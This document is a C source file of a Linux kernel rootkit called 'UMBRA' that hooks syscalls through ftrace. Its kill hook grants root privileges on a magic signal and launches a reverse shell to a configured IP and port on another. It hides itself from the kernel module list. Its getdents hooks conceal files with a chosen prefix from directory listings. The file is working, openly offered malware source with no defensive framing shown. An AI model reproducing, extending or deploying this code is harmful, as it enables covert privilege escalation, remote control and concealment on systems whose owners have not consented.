#include "../include/hookers.h"
#include "../include/utils.h"
#include "../include/CONFIG.h"

asmlinkage long (*orig_mkdir)(const struct pt_regs*);
asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
   
    char dir_name[NAME_MAX] = {0};
    long err;

    printk(KERN_INFO "UMBRA:: mkdir hooked x64!");
    //Getting pathname from userspace, which is out of our module address space
    err = strncpy_from_user(dir_name, pathname, NAME_MAX);
    // Returns -EFAULT if error, number of copied bytes otherwise
    if (err>0){
        printk(KERN_INFO "UMBRA:: Detected mkdir %s\n", dir_name);
    }

    orig_mkdir(regs);
    return 0;
}



//Keep track of whether the rootkit is hidden or not
static int rootkit_visibility = 1;
//Previous module on kernel module list, to remember the original position in case we remove it
static struct list_head *prev_module;

void hide_rootkit(void){
    //Removing the rootkit from the linked list of modules maintained by the kernel
    printk(KERN_INFO "UMBRA:: Module hidden.\n");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    rootkit_visibility = 0; //hidden
}

void show_rootkit(void){
    //Adding the rootkit to the linked list of modules maintained by the kernel
    printk(KERN_INFO "UMBRA:: Module visible.\n");
    list_add(&THIS_MODULE->list, prev_module);
    rootkit_visibility = 1;//visible
}

asmlinkage long (*orig_kill)(const struct pt_regs*);
asmlinkage int hook_kill(const struct pt_regs *regs){
    void set_root(void);
    int sig = regs->si;

    //If SIGNAL_KILL_HOOK, grant root privileges
    if (sig == SIGNAL_KILL_HOOK){
        printk(KERN_INFO "UMBRA:: Giving root privileges.\n");
        change_self_privileges_to_root();
        return orig_kill(regs);
    }else if(sig == SIGNAL_REVERSE_SHELL){
        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    }else if(sig == SIGNAL_SHOW_KERNEL_MODULE){
        if(rootkit_visibility == 1){
            printk(KERN_INFO "UMBRA:: Requested visibility, but already visible.\n");
            return orig_kill(regs);
        }
        show_rootkit();
    }else if(sig == SIGNAL_HIDE_KERNEL_MODULE){
        if(rootkit_visibility == 0){
            printk(KERN_INFO "UMBRA:: Requested hiding, but already hidden.\n");
            return orig_kill(regs);
        }
        hide_rootkit();
    }

    return orig_kill(regs);
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage int hook_getdents64(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *prev_dir, *current_dir, *dirent_ker = NULL;
    long err;
    int ret;
    
    //Offset to address each of the directories in dirent struct.
    unsigned long offset = 0;

    //Real getdents function, now we modify the results for our convenience
    //Allocate a buffer for use to operate with
    ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (ret<=0 || dirent_ker==NULL){
        return ret;
    }
        
    //Copy original buffer to the buffer we will manipulate
    err = copy_from_user(dirent_ker, dirent, ret);
    if(err){
        kfree(dirent_ker);
        return ret;
    }
        
    //iterate through all directories
    while (offset < ret){
        current_dir = (void *)dirent_ker + offset;

        //Check if directory/file contains the umbra prefix
        if(memcmp(UMBRA_DIRECTORY_PREFIX, current_dir->d_name, strlen(UMBRA_DIRECTORY_PREFIX))==0){
            //Special case directory/file is the first
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            //We hide this entry by incrementing the rec_len field, now pointing to the next entry
            prev_dir->d_reclen += current_dir->d_reclen;
            printk(KERN_INFO "UMBRA:: Skipped over secret entry.\n");
        }else{
            prev_dir = current_dir;
        }
        //Next entry
        offset += current_dir->d_reclen;
    }
    err = copy_to_user(dirent, dirent_ker, ret);
    if(err){
        kfree(dirent_ker);
    }

    return ret;
}

//Defining the same getdents hook but for x32 systems.
//I've found that some x64 systems also call getdents and not getdents64 with ls for some reason
//You can check it with strace ls
struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
};
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
asmlinkage int hook_getdents(const struct pt_regs *regs){
    struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *prev_dir, *current_dir, *dirent_ker = NULL;
    long err;
    int ret;
    
    //Offset to address each of the directories in dirent struct.
    unsigned long offset = 0;

    //Real getdents function, now we modify the results for our convenience
    //Allocate a buffer for use to operate with
    ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (ret<=0 || dirent_ker==NULL){
        return ret;
    }
        
    //Copy original buffer to the buffer we will manipulate
    err = copy_from_user(dirent_ker, dirent, ret);
    if(err){
        kfree(dirent_ker);
        return ret;
    }
        
    //iterate through all directories
    while (offset < ret){
        current_dir = (void *)dirent_ker + offset;

        //Check if directory/file contains the umbra prefix
        if(memcmp(UMBRA_DIRECTORY_PREFIX, current_dir->d_name, strlen(UMBRA_DIRECTORY_PREFIX))==0){
            //Special case directory/file is the first
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            //We hide this entry by incrementing the rec_len field, now pointing to the next entry
            prev_dir->d_reclen += current_dir->d_reclen;
            printk(KERN_INFO "UMBRA:: Skipped over secret entry.\n");
        }else{
            prev_dir = current_dir;
        }
        //Next entry
        offset += current_dir->d_reclen;
    }
    err = copy_to_user(dirent, dirent_ker, ret);
    if(err){
        kfree(dirent_ker);
    }
    return ret;
}



// Syscalls to be hooked using frace
struct ftrace_hook hooks[] = {
    //HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hook_getdents, &orig_getdents)
};

void remove_all_hooks(void){
    remove_hooks_set(hooks, ARRAY_SIZE(hooks));
}

int install_all_hooks(void){
    return install_hooks_set(hooks, ARRAY_SIZE(hooks));
}